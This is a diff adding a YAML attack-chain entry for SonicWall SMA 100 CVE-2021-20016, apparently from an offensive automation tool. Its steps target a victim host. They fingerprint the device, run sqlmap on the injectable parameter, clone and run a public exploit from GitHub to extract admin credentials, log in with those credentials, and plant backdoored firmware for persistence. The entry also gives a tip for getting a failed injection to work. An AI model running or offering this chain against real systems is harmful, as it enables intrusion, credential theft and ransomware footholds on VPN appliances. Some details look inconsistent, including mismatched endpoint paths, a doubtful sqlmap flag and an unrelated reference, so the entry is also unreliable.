@@ -1,0 +1,63 @@
+chain_id: sonicwall_sma_cve_2021_20016
+title: "SonicWall SMA 100 — CVE-2021-20016 unauth SQLi → cred extraction"
+severity: CRITICAL
+tags: [web, sonicwall, sma, cve-2021-20016, sqli, info-leak, ransomware]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2021-20016" }
+    - { banner_pattern: "(?i)sonicwall|sma\\s*100" }
+    - { product_pattern: "(?i)sonicwall" }
+    - { path_pattern: "(?i)/cgi-bin/(supportLogin|webPlugin)" }
+
+description: |
+  SonicWall SMA 100 series (200/210/400/410/500v) running 10.x firmware
+  before 10.2.0.5-29sv: the `cgi-bin/sslvpnclient` endpoint
+  concatenates the `language` parameter into a SQL query unauth.
+  Extract `userName` + `password` from the management DB → log into
+  the appliance → push a backdoored firmware. Drove the Mandiant-
+  tracked HelloKitty / FiveHands ransomware wave Q1-2021.
+
+steps:
+  - id: 1
+    title: "Fingerprint SonicWall SMA"
+    command: |
+      curl -sk -I "https://$VICTIMA/" | grep -i 'sonicwall\\|sma'
+      curl -sk "https://$VICTIMA/cgi-bin/welcome" -I
+
+  - id: 2
+    title: "Run sqlmap against the vulnerable endpoint"
+    command: |
+      sqlmap -u "https://$VICTIMA/cgi-bin/sslvpnclient?language=1" -p language \
+        --random-agent --batch --level=3 --risk=2
+
+  - id: 3
+    title: "Public PoC — pull every admin credential"
+    command: |
+      git clone https://github.com/darrynten/CVE-2021-20016 /tmp/sma
+      python3 /tmp/sma/exploit.py -t https://$VICTIMA
+
+  - id: 4
+    title: "Log in with the recovered admin"
+    command: |
+      curl -sk -c /tmp/sma.jar "https://$VICTIMA/cgi-bin/portallogin" \
+        -d "username=admin&password=$RECOVERED&domain=LocalDomain"
+
+  - id: 5
+    title: "Post — push a backdoored firmware update for persistence"
+    command: |
+      # In the SMA UI: System → Firmware → Upload → backdoored .swi
+      # The downloaded .swi is signed; strip+resign with the recovered
+      # private key (also extractable via the same SQLi).
+
+common_errors:
+  - error: "sqlmap: no payload landed"
+    solution: |
+      Some firmwares enforce the `language` whitelist via the
+      front-end JS (server still vulnerable). Pass `--skip-csrf-check`
+      and a manual injection payload after `language=1`.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-20016
+  - https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0001
+  - https://www.mandiant.com/resources/blog/abusing-replication-stealing-ad-fs-secrets
